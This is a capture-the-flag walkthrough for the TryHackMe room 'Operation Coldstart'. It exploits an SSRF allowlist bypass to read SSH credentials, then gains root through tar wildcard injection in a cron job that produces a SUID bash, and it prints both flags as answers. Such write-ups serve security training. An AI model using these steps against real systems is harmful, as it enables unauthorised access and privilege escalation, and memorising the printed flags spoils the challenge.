# [TryHackMe | Operation Coldstart](https://tryhackme.com/room/operationcoldstart) Challenge Room Solution Writeup

### What is the content of user.txt?

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-10-66-84-249:~# nmap -sV -sC -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09  2026 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.66.84.249
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3c:32:98:0e:e4:fd:b3:22:71:07:c3:56:a9:44:a1:b6 (ECDSA)
|_  256 14:ca:15:25:42:42:62:e9:56:6a:e0:2a:43:1f:fc:5e (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: URL Preview - Volt Labs
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: 
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: 
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2943
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>URL Preview - Volt Labs</title>
|     <style>
|     :root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
|     *{box-sizing:border-box}
|     body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
|     a{color:var(--primary);text-decoration:none}
|     a:hover{text-decoration:underline}
|     .navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
|     .navbar .brand{font-w
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: 
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=11/13%Time=6AF74AD5%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,C1A,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:2943\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x2
SF:0charset=\"utf-8\">\n<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n<title>URL\x20Preview\x20-\x20Volt\x20
SF:Labs</title>\n<style>\n:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff
SF:;--text:#212529;--muted:#6c757d;--border:#dee2e6}\n\*{box-sizing:border
SF:-box}\nbody{margin:0;font-family:-apple-system,BlinkMacSystemFont,\"Seg
SF:oe\x20UI\",Roboto,\"Helvetica\x20Neue\",Arial,sans-serif;font-size:16px
SF:;line-height:1\.5;color:var\(--text\);background:var\(--bg\)}\na{color:
SF:var\(--primary\);text-decoration:none}\na:hover{text-decoration:underli
SF:ne}\n\.navbar{background:#212529;color:#fff;padding:\.75rem\x201\.5rem;
SF:display:flex;align-items:center;justify-content:space-between;box-shado
SF:w:0\x201px\x203px\x20rgba\(0,0,0,\.08\)}\n\.navbar\x20\.brand{font-w")%
SF:r(HTTPOptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate
SF::\\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x2
SF:0HEAD,\x20OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-T
SF:ype:\x20text/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<hea
SF:d>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x2
SF:0\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x
SF:20\x20Invalid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x
SF:20&#x27;RTSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFou
SF:rRequest,170,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r
SF:\nDate:\r\nConnection:\
SF:x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
SF:gth:\x20207\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x2
SF:0Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20UR
SF:L\x20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20enter
SF:ed\x20the\x20URL\x20manually\x20please\x20check\x20your\x20spelling\x20
SF:and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.96 seconds
```

Use `gobuster` to map out the directory structure of the `TARGET_IP` website. 

```yaml
oot@ip-10-66-84-249:~# gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -r -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 213]
/preview              (Status: 400) [Size: 2493]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Inspect `http://TARGET_IP/` to discover a URL preview page, which cannot be used for now since it filters requests by an unknown `hostname` allowlist.

```html
root@ip-10-66-84-249:~# curl -sX GET http://TARGET_IP/ | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>URL Preview - Volt Labs</title>
</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">
    <div class="card">
        <h1>URL Preview Service</h1>
        <p class="muted">Internal tool. Paste a URL below to preview its contents.</p>
        <form method="get" action="/preview">
            <div class="form-group">
                <label for="url">URL</label>
                <input id="url" type="text" name="url" class="form-control" placeholder="https://example.com/" required>
            </div>
            <button type="submit" class="btn btn-primary">Preview</button>
        </form>
    </div>
    </main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>
```

There is an open `FTP` server, check if it supports anonymous login, then find and get available files.

```bash
root@ip-ATTACKER_IP:~# ftp ftp://anonymous:anonymous@TARGET_IP
Connected to TARGET_IP.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls -l
229 Entering Extended Passive Mode (|||40092|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 09  2026 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -l
229 Entering Extended Passive Mode (|||40020|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          2446 May 09  2026 backup.tar.gz
226 Directory send OK.
ftp> get backup.tar.gz
local: backup.tar.gz remote: backup.tar.gz
229 Entering Extended Passive Mode (|||40059|)
150 Opening BINARY mode data connection for backup.tar.gz (2446 bytes).
100% |*************************************************************|  2446        7.87 MiB/s    00:00 ETA
226 Transfer complete.
2446 bytes received in 00:00 (2.94 MiB/s)
ftp> exit
221 Goodbye.
```

Extract and read the contents of `backup.tar.gz` to discover the `hostname` allowlist `domain=kestrel.thm`, a potential Server-Side Request Forgery (SSRF) vulnerability for `/preview`, and `/opt/voltlabs-preview/admin_notes.txt` accessible via `admin/notes`.

```py
root@ip-ATTACKER_IP:~# tar -xvzf backup.tar.gz 
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
root@ip-ATTACKER_IP:~# cat voltlabs-preview/requirements.txt 
flask
requests
gunicorn
root@ip-ATTACKER_IP:~# cat voltlabs-preview/README.md 
# Volt Labs URL Preview

Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.

Admin routes are gated by source-IP check (localhost only).
root@ip-ATTACKER_IP:~# cat voltlabs-preview/app.py 
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}

CSS = """
<style>
:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
a{color:var(--primary);text-decoration:none}
a:hover{text-decoration:underline}
.navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.navbar .brand{font-weight:600;font-size:1.125rem;letter-spacing:.2px}
.navbar .muted-light{color:#a5acb3;font-size:.95rem}
.container{max-width:960px;margin:2rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--border);border-radius:.5rem;padding:1.5rem;margin-bottom:1.25rem;box-shadow:0 1px 2px rgba(0,0,0,.04)}
h1{font-size:1.75rem;margin:0 0 .75rem}
h2{font-size:1.25rem;margin:1.25rem 0 .5rem}
.muted{color:var(--muted);font-size:.95rem}
.form-group{margin-bottom:1rem}
label{display:block;margin-bottom:.25rem;font-weight:500;font-size:.95rem}
.form-control{display:block;width:100%;padding:.5rem .75rem;font-size:1rem;line-height:1.5;color:var(--text);background:#fff;border:1px solid var(--border);border-radius:.375rem;transition:border-color .15s,box-shadow .15s}
.form-control:focus{outline:0;border-color:#86b7fe;box-shadow:0 0 0 .2rem rgba(13,110,253,.25)}
.btn{display:inline-block;padding:.5rem 1rem;font-size:1rem;font-weight:500;border:1px solid transparent;border-radius:.375rem;cursor:pointer;transition:background .15s}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:#0b5ed7}
pre{background:#f1f3f5;border:1px solid var(--border);border-radius:.375rem;padding:.75rem;overflow:auto;font-size:.9rem;white-space:pre-wrap;word-break:break-word}
footer.site{text-align:center;color:var(--muted);margin:2rem 0;font-size:.875rem}
</style>
"""

def page(title, body):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title} - Volt Labs</title>{CSS}</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">{body}</main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>"""

@app.route("/")
def index():
    body = """
    <div class="card">
        <h1>URL Preview Service</h1>
        <p class="muted">Internal tool. Paste a URL below to preview its contents.</p>
        <form method="get" action="/preview">
            <div class="form-group">
                <label for="url">URL</label>
                <input id="url" type="text" name="url" class="form-control" placeholder="https://example.com/" required>
            </div>
            <button type="submit" class="btn btn-primary">Preview</button>
        </form>
    </div>
    """
    return page("URL Preview", body)

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    if not target:
        return page("Preview Error",
                    '<div class="card"><p>Provide a <code>?url=</code> parameter.</p></div>'), 400

    # VULN: hostname allow-list is the only check. No scheme check, no path check,
    # no localhost-rebind protection - the SSRF is still abusable, but only
    # against the allowed hostname.
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked",
                    '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

    try:
        r = requests.get(target, timeout=3)
        safe_target = html.escape(target)
        safe_body = r.text.replace("<", "&lt;")
        body = f"""
        <div class="card">
            <h2>Preview of {safe_target}</h2>
            <pre>{safe_body}</pre>
        </div>
        """
        return page("Preview", body)
    except Exception as e:
        safe_err = html.escape(str(e))
        return page("Preview Failed",
                    f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

Update `/etc/hosts`.

```bash
root@ip-ATTACKER_IP:~# echo 'TARGET_IP kestrel.thm' >> /etc/hosts
```

Combine this information in a SSRF attack to discover `SSH` credentials of `username=webdev&password=V0ltLabs#summer`.

```html
root@ip-ATTACKER_IP:~# curl -sG http://kestrel.thm/preview --data-urlencode 'url=http://kestrel.thm/admin/notes' | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Preview - Volt Labs</title>
</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">
        <div class="card">
            <h2>Preview of http://kestrel.thm/admin/notes</h2>
            <pre>&lt;pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
&lt;/pre></pre>
        </div>
        </main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>
```

Connect to the `SSH` service running on port `22` using `username=webdev&password=V0ltLabs#summer`.

```bash
root@ip-ATTACKER_IP:~# ssh webdev@kestrel.thm
The authenticity of host 'kestrel.thm (TARGET_IP)' can't be established.
ED25519 key fingerprint is SHA256:4ifRSxLzjJZrvxSPuGL8U5LiFoBrenjvZcQWg6AhAog.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'kestrel.thm' (ED25519) to the list of known hosts.
(webdev@kestrel.thm) Password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-1015-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of 

  System load:  0.0               Temperature:           -273.1 C
  Usage of /:   9.4% of 38.70GB   Processes:             112
  Memory usage: 20%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: TARGET_IP

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

webdev@coldstart:~$ whoami
webdev
webdev@coldstart:~$ id
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
webdev@coldstart:~$ ls -l
total 4
-rw------- 1 webdev webdev 38 May  9  2026 user.txt
webdev@coldstart:~$ cat user.txt 
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

The captured flag is **THM{96dc7bd50d2fb98fcece01560788b5ab}**.

### What is the content of flag.txt?

Check for `sudo` privileges to discover none.

```bash
webdev@coldstart:~$ sudo -l
[sudo] password for webdev: 
Sorry, user webdev may not run sudo on coldstart.
```

Enumerate the system's scheduled `cron` jobs and identify `voltlabs-backup`, which executes every minute as `root`. The job uses a wildcard (`*`) when invoking `tar`, potentially exposing the system to a wildcard injection vulnerability.

```bash
webdev@coldstart:~$ ls -l /etc/cron*
-rw-r--r-- 1 root root 1136 Mar 31  2024 /etc/crontab

/etc/cron.d:
total 12
-rw-r--r-- 1 root root 201 Feb 14  2020 e2scrub_all
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
-rw-r--r-- 1 root root 194 May  9  2026 voltlabs-backup

/etc/cron.daily:
total 28
-rwxr-xr-x 1 root root  376 Dec  4  2019 apport
-rwxr-xr-x 1 root root 1478 Sep  5  2024 apt-compat
-rwxr-xr-x 1 root root  355 Dec 29  2017 bsdmainutils.dpkg-remove
-rwxr-xr-x 1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x 1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x 1 root root 1395 Mar 29  2024 man-db
-rwxr-xr-x 1 root root  518 Jan  9  2024 sysstat

/etc/cron.hourly:
total 0

/etc/cron.monthly:
total 0

/etc/cron.weekly:
total 4
-rwxr-xr-x 1 root root 1055 Mar 29  2024 man-db

/etc/cron.yearly:
total 0
webdev@coldstart:~$ cat /etc/cron.d/voltlabs-backup 
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Verify that the current user has write access to `/opt/backups`. 

```bash
webdev@coldstart:~$ ls -ld /opt/backups
drwxrwx--- 2 webdev webdev 4096 May  9  2026 /opt/backups
webdev@coldstart:~$ ls -l /opt/backups/
total 0
```

Since the `root`-owned `cron` job invokes `tar` with a wildcard (`*`), specially named files can be interpreted as command-line options when the wildcard is expanded. Create two files named `--checkpoint=1` and `--checkpoint-action=exec=id`. The `--checkpoint` option determines how frequently `tar` generates checkpoints while processing the archive, whereas `--checkpoint-action` specifies the action to execute when a checkpoint is reached. By combining these options, the wildcard injection can induce the `cron` job to execute an arbitrary command with `root` privileges when it runs. Create a `root` shell copy in `/opt/backups` and give it executable permissions. Then create the corresponding checkpoint files.

```bash
webdev@coldstart:~$ cat > /opt/backups/rootbash.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
webdev@coldstart:~$ chmod +x /opt/backups/rootbash.sh
webdev@coldstart:~$ touch '/opt/backups/--checkpoint=1'
webdev@coldstart:~$ touch '/opt/backups/--checkpoint-action=exec=bash rootbash.sh'
webdev@coldstart:~$ ls -l /opt/backups/
total 4
-rw-rw-r-- 1 webdev webdev  0  '--checkpoint-action=exec=bash rootbash.sh'
-rw-rw-r-- 1 webdev webdev  0  '--checkpoint=1'
-rwxrwxr-x 1 webdev webdev 94   rootbash.sh
```

Wait for a minute then verify the creation and permissions of `/tmp/rootbash`, then run it with `-p` to preserve the `UID`.

```bash
webdev@coldstart:~$ ls -l /tmp/ | grep rootbash
-rwsr-xr-x 1 root root 1446024  rootbash
webdev@coldstart:~$ /tmp/rootbash -p
rootbash-5.2# whoami
root
rootbash-5.2# id
uid=1001(webdev) gid=1001(webdev) euid=0(root) groups=1001(webdev)
rootbash-5.2# cd /root/
rootbash-5.2# ls -l
total 8
-rw------- 1 root root   38 May  9  2026 flag.txt
drwxr-xr-x 4 root root 4096 Oct 22  2024 snap
rootbash-5.2# cat flag.txt 
THM{e6ee84a483d67ade06936fcfd1433e8a}
rootbash-5.2# 
```

The captured flag is **THM{e6ee84a483d67ade06936fcfd1433e8a}**.